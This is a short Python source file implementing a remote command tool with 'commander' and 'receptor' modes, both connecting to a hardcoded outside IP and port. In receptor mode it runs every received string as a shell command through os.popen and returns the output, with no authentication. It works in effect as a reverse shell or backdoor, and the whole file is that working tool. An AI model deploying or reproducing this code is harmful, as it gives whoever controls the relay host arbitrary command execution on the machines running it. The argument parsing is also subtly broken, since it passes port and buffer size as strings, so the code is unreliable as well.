from socket import socket, AF_INET, SOCK_STREAM
from threading import Thread
from os import popen, path
import hashlib
import sys


class Terminator(Thread):
    def __init__(self, argv):
        super().__init__()
        self.HOST = '118.89.58.129'
        self.PORT = 11226
        self.buffSize = 1024
        if len(argv) >= 3:
            self.HOST = argv[2]
            if len(argv) >= 4:
                self.PORT = argv[3]
                if len(argv) == 5:
                    self.buffSize = argv[4]
        self.COMMANDER, self.RECEPTOR = 'commander', 'receptor'
        self.ADDR = (self.HOST, self.PORT)
        self.HOST_TCP = socket(AF_INET, SOCK_STREAM)
        self.HOST_TCP.connect(self.ADDR)
        self.isReceived = False
        self.data = None
        self.TerminateType = argv[1]

    def sendCommand(self):
        while True:
            data = input('Command -> ')
            if data == 'quit':
                break
            # elif data == 'file':
            #     fileName = input('please enter file name with path: ')
            #     if fileName == 'cancel':
            #         continue
            #     else:
            #         if path.isfile(fileName):
            #             file = open(fileName, 'rb')
            #             MD5Encoder = hashlib.md5()

            self.HOST_TCP.send(data.encode())
        self.HOST_TCP.close()

    def commandExecute(self):
        while True:
            if self.isReceived:
                self.isReceived = False
                output = popen(self.data.decode(), 'r')
                self.HOST_TCP.send(output.read().encode())

    def commanderReceive(self):
        while True:
            try:
                data = self.HOST_TCP.recv(self.buffSize)
                print('\nResponse -> ' + data.decode() + '\nCommand -> ')
            except OSError:
                return  # find it was close, then close it

    def receptorReceive(self):
        while True:
            try:
                self.data = self.HOST_TCP.recv(self.buffSize)
                self.isReceived = True
            except OSError:
                pass  # find it was close, then wait for connection

    def run(self):
        if self.TerminateType == self.COMMANDER:
            self.commanderReceive()
        elif self.TerminateType == self.RECEPTOR:
            self.receptorReceive()

    def task(self):
        if self.TerminateType == self.COMMANDER:
            self.sendCommand()
        elif self.TerminateType == self.RECEPTOR:
            self.commandExecute()


if __name__ == '__main__':

    if len(sys.argv) > 1:
        terminator = Terminator(sys.argv)
        terminator.start()
        terminator.task()
    else:
        print("\n")
        print("Usage: python3 client.py [commander|receptor]")
        print("Options:    Host IP    | Port  | buffSize")
        print("default: 118.89.58.129 | 11226 |   1024  ")
        print("\n")